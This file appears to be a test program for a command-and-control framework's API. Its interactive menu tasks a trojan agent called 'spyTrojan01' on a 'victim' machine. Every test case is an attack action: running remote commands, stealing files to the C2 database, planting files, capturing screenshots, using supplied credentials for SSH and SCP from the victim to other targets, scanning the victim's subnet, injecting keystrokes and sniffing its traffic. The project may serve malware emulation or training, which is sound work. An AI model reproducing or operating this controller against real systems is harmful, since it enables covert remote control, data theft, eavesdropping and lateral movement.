#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        c2AppAPITest.py [python3]
#
# Purpose:     This module is the test case program used to test all the C2API.
#  
# Author:      Yuancheng Liu
#
# Created:     2024/05/23
# version:     v0.2.2
# Copyright:   Copyright (c) 2022 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------

import os
import sys

print("Current working directory is : %s" % os.getcwd())
dirpath = os.path.dirname(os.path.abspath(__file__))
print("Current source code location : %s" % dirpath)
APP_NAME = ('c2APItest', 'testCase')

TOPDIR = 'src'
LIBDIR = 'lib'

idx = dirpath.find(TOPDIR)
gTopDir = dirpath[:idx + len(TOPDIR)] if idx != -1 else dirpath   # found it - truncate right after TOPDIR
# Config the lib folder 
gLibDir = os.path.join(gTopDir, LIBDIR)
if os.path.exists(gLibDir): sys.path.insert(0, gLibDir)

import time
import requests
import c2Constants
import c2Client

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------

ownID = 'API_Test_Program'
malware1id = 'spyTrojan01'
c2IP  = ('127.0.0.1', 5001)
httpsFlg = False
c2Client = c2Client.c2Client(ownID, c2IP[0], c2Port=c2IP[1], downloadDir=dirpath, httpsFlg=httpsFlg)
print("Connected to C2")

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def testcase1():
    print("Test case 1: Download file via c2Client API Function")
    fileName = 'picctureTestDownload.png'
    filePath = os.path.join(dirpath, fileName)
    print("Downloading file %s" % filePath)
    c2Client.downloadfile(fileName, fileDir=dirpath)
    rst = 'Pass' if os.path.exists(filePath) else 'failed'
    print("- test result : %s" % rst)

#-----------------------------------------------------------------------------
def testcase2():
    print("Test case 2: Download file via http request")
    jsonDict = {"filename": 'readme.pdf'}
    getUrl = "http://%s:%s/filedownload" % (c2IP[0], c2IP[1])
    res = requests.get(getUrl, json=jsonDict, allow_redirects=True, verify=False) # set allow redirect to by pass load balancer
    filePath = os.path.join(dirpath, 'readme.pdf')
    if res.ok:
        with open(filePath, 'wb') as fh:
            fh.write(res.content)
    rst = 'Pass' if os.path.exists(filePath) else 'failed'
    print("- test result : %s" % rst)

#-----------------------------------------------------------------------------
def testcase3():
    print("Test case 3: Upload file to C2 via c2Client API")
    fileName = 'update_installer.zip'
    filePath = os.path.join(dirpath, fileName)
    rst = c2Client.uploadfile(filePath)
    rst = 'Pass' if os.path.exists(filePath) else 'failed'
    print("- test result : %s" % rst)

#-----------------------------------------------------------------------------
def testcase4():
    print("Test case 4: Download file via http request")
    fileName = 'update_installer.zip'
    filePath = os.path.join(dirpath, fileName)
    rst = False
    with open(filePath, 'rb') as fh:
        postUrl = "http://%s:%s/fileupload" % (c2IP[0], c2IP[1])
        rst = requests.post(postUrl, files={'file': (fileName, fh.read())}, verify=False)
    rst = 'Pass' if os.path.exists(filePath) else 'failed'
    print("- test result : %s" % rst)
    
#-----------------------------------------------------------------------------
def testcase5():
    print("Test case 5: Run commands on victim via c2Client API")
    global malware1id
    testTaskJson = {
                'taskType'  : c2Constants.TSK_TYPE_CMD,
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : c2Constants.TASK_P_FLG,
                'taskData'  : ['ipconfig']
            }
    c2Client.postTask(malware1id, testTaskJson)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase6():
    print("Test case 6: Run commands on victim via http request")
    global malware1id
    jsonDict = {
        'id'        : malware1id, 
        'taskType'  : 'command',
        'startT'    : None,
        'repeat'    : 1,
        'exePreT'   : 0,
        'state'     : 0,
        'taskData'  : ['dir']
    }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase7():
    print("Test case 7: Steal file from victim to C2-DB via c2Client API")
    global malware1id
    filePath = os.path.join(dirpath, 'update_installer.zip')
    testTaskJson = {
                'taskType'  : c2Constants.TSK_TYPE_UPLOAD,
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : c2Constants.TASK_P_FLG,
                'taskData'  : [filePath]
            }
    c2Client.postTask(malware1id, testTaskJson)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase8():
    print("Test case 8: Steal file from victim to C2-DB via http request")
    global malware1id
    filePath = os.path.join(dirpath, 'update_installer.zip')
    jsonDict = {
                'id'        : malware1id, 
                'taskType'  : 'upload',
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : 0,
                'taskData'  : [filePath]
            }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase9():
    print("Test case 9: Inject file from C2-DB to victim via c2Client API")
    global malware1id
    testTaskJson = {
                'taskType'  : c2Constants.TSK_TYPE_DOWNLOAD,
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : c2Constants.TASK_P_FLG,
                'taskData'  : ['picctureTestDownload.png']
            }
    c2Client.postTask(malware1id, testTaskJson)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)


#-----------------------------------------------------------------------------
def testcase10():
    print("Test case 10: Inject file from C2-DB to victim via http request")
    global malware1id
    jsonDict = {
                'id'        : malware1id, 
                'taskType'  : 'download',
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : 0,
                'taskData'  : ['picctureTestDownload.png']
            }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase11():
    print("Test case 11: Capture victim screenshot to C2-DB via c2Client API")
    global malware1id
    testTaskJson = {
                'taskType'  : c2Constants.TSK_TYPE_SCREENST,
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : c2Constants.TASK_P_FLG,
                'taskData'  : 'None'
            }
    c2Client.postTask(malware1id, testTaskJson)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)


#-----------------------------------------------------------------------------
def testcase12():
    print("Test case 12: Capture victim screenshot to C2-DB via http request")
    global malware1id
    jsonDict = {
                'id'        : malware1id, 
                'taskType'  : 'screenShot',
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : 0,
                'taskData'  : None
            }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase13():
    print("Test case 13: SSH to target and tun command from victim via c2Client API")
    global malware1id
    targetIP = str(input("Input target IP/Domain : "))
    userName = str(input("Input UserName : "))
    password = str(input("Input Password : "))
    command = str(input("Input command : "))
    testTaskJson = {
        'taskType': c2Constants.TSK_TYPE_SSH,
        'startT': None,
        'repeat': 1,
        'exePreT': 0,
        'state': c2Constants.TASK_P_FLG,
        'taskData': ';'.join((targetIP, userName, password, command))
    }
    c2Client.postTask(malware1id, testTaskJson)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase14():
    print("Test case 14: SSH to target and tun command from victim via http request")
    global malware1id
    targetIP = str(input("Input target IP/Domain  : "))
    userName = str(input("Input UserName : "))
    password = str(input("Input Password : "))
    command = str(input("Input command : "))
    jsonDict = {
                'id'        : malware1id, 
                'taskType'  : 'sshRun',
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : 0,
                'taskData'  : ';'.join((targetIP, userName, password, command))
            }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase15():
    print("Test case 15: SCP file from victim to target via c2Client API")
    global malware1id
    targetIP = str(input("Input target IP/Domain : "))
    userName = str(input("Input UserName : "))
    password = str(input("Input Password : "))
    filename = str(input("Input filename : "))
    testTaskJson = {
        'taskType': c2Constants.TSK_TYPE_SCP,
        'startT': None,
        'repeat': 1,
        'exePreT': 0,
        'state': c2Constants.TASK_P_FLG,
        'taskData': ';'.join((targetIP, userName, password, filename))
    }
    c2Client.postTask(malware1id, testTaskJson)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase16():
    print("Test case 16: SCP file from victim to target via http request")
    global malware1id
    targetIP = str(input("Input target IP/Domain  : "))
    userName = str(input("Input UserName : "))
    password = str(input("Input password : "))
    command = str(input("Input filename : "))
    jsonDict = {
                'id'        : malware1id, 
                'taskType'  : 'scpFile',
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : 0,
                'taskData'  : ';'.join((targetIP, userName, password, command))
            }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase17():
    print("Test case 17: Scan victim sub-network IPs via c2Client API")
    global malware1id
    testTaskJson = {
        'taskType': c2Constants.TSK_TYPE_SCANNET,
        'startT': None,
        'repeat': 1,
        'exePreT': 0,
        'state': c2Constants.TASK_P_FLG,
        'taskData': '172.25.120.0/24'
    }
    c2Client.postTask(malware1id, testTaskJson)
    time.sleep(30)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase18():
    print("Test case 18: Scan victim sub-network IPs via http request")
    global malware1id
    jsonDict = {
                'id'        : malware1id, 
                'taskType'  : 'scanSubnet',
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : 0,
                'taskData'  : '172.25.120.0/24'
            }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase19():
    print("Test case 19: Generate or record keyboard event via c2Client API")
    global malware1id
    testTaskJson = {
        'taskType': c2Constants.TSK_TYPE_KEYBD,
        'startT': None,
        'repeat': 1,
        'exePreT': 0,
        'state': c2Constants.TASK_P_FLG,
        'taskData': 'typeInStr;Hello world!'
    }
    c2Client.postTask(malware1id, testTaskJson)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase20():
    print("Test case 20: Generate or record keyboard event via http request")
    global malware1id
    jsonDict = {
                'id'        : malware1id, 
                'taskType'  : 'keyEvent',
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : 0,
                'taskData'  : 'typeInStr;Hello world!'
            }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase21():
    print("Test case 21: EavesDrop victim's traffic in pcap file via c2Client API")
    global malware1id
    testTaskJson = {
        'taskType': c2Constants.TSK_TYPE_EAVESDP,
        'startT': None,
        'repeat': 1,
        'exePreT': 0,
        'state': c2Constants.TASK_P_FLG,
        'taskData': 'Wi-Fi;\\Device\\NPF_{172B21B5-878D-41B5-9C51-FE1DD27C469B};10'
    }
    c2Client.postTask(malware1id, testTaskJson)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

#-----------------------------------------------------------------------------
def testcase22():
    print("Test case 22: EavesDrop victim's traffic in pcap file via http request")
    global malware1id
    jsonDict = {
                'id'        : malware1id, 
                'taskType'  : 'eavesDrop',
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : 0,
                'taskData'  : 'Wi-Fi;\\Device\\NPF_{172B21B5-878D-41B5-9C51-FE1DD27C469B};10'
            }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
    time.sleep(10)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)

def testcase23():
    print("Test case 23: ping ip address range via http request.")
    global malware1id
    jsonDict = {
                'id'        : malware1id, 
                'taskType'  : 'ping',
                'startT'    : None,
                'repeat'    : 1,
                'exePreT'   : 0,
                'state'     : 0,
                'taskData'  : '192.168.1.1;10'
            }
    requests.post("http://%s:%s/taskPost" % (c2IP[0], c2IP[1]), json=jsonDict)
    time.sleep(20)
    result = c2Client.getLastRst(malwareID=malware1id)
    print("- test result : %s" % result)


#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    global malware1id
    terminate = False
    print("Enter the agent id you want to connected with (if leave blank, use default 'spyTrojan01'): ")
    inputID = str(input()).strip()
    if inputID != '': malware1id = inputID
    while not terminate:
        print("-------------------------------------------------------------")
        print("0. exist test program")
        print("1. Download file via c2Client API")
        print("2: Download file via http request")
        print("3. Upload file to C2 via c2Client API")
        print("4. Upload file to C2 via http request")
        print("5. Run commands on victim via c2Client API")
        print("6. Run commands on victim via http request")
        print("7. Steal file from victim to C2-DB via c2Client API")
        print("8. Steal file from victim to C2-DB via http request")
        print("9. Inject file from C2-DB to victim via c2Client API")
        print("10. Inject file from C2-DB to victim via http request")
        print("11. Capture victim screenshot to C2-DB via c2Client API")
        print("12. Capture victim screenshot to C2-DB via http request")
        print("13. SSH to target and tun command from victim via c2Client API")
        print("14. SSH to target and tun command from victim via http request")
        print("15. SCP file from victim to target via c2Client API")
        print("16. SCP file from victim to target via http request")
        print("17. Scan victim sub-network IPs via c2Client API")
        print("18. Scan victim sub-network IPs via http request")
        print("19. Generate or record keyboard event via c2Client API")
        print("20. Generate or record keyboard event via http request")
        print("21. EavesDrop victim's traffic in pcap file via c2Client API")
        print("22. EavesDrop victim's traffic in pcap file via http request")
        print("23. Ping ip address range via http request.")

        selection = int(input("Enter your selection:"))
        if selection == 1:
            testcase1()
        elif selection == 2:
            testcase2()
        elif selection == 3:
            testcase3()
        elif selection == 4:
            testcase4()
        elif selection == 5:
            testcase5()
        elif selection == 6:
            testcase6()
        elif selection == 7:
            testcase7()
        elif selection == 8:
            testcase8()
        elif selection == 9:
            testcase9()
        elif selection == 10:
            testcase10()
        elif selection == 11:
            testcase11()
        elif selection == 12:
            testcase12()
        elif selection == 13:
            testcase13()
        elif selection == 14:
            testcase14()
        elif selection == 15:
            testcase15()
        elif selection == 16:
            testcase16()
        elif selection == 17:
            testcase17()
        elif selection == 18:
            testcase18()
        elif selection == 19:
            testcase19()
        elif selection == 20:
            testcase20()
        elif selection == 21:
            testcase21()
        elif selection == 22:
            testcase22()
        elif selection == 23:
            testcase23()
        elif selection == 0:
            terminate = True
        else:
            terminate = True

    c2Client.stop()


#-----------------------------------------------------------------------------
if __name__ == '__main__':
    main()

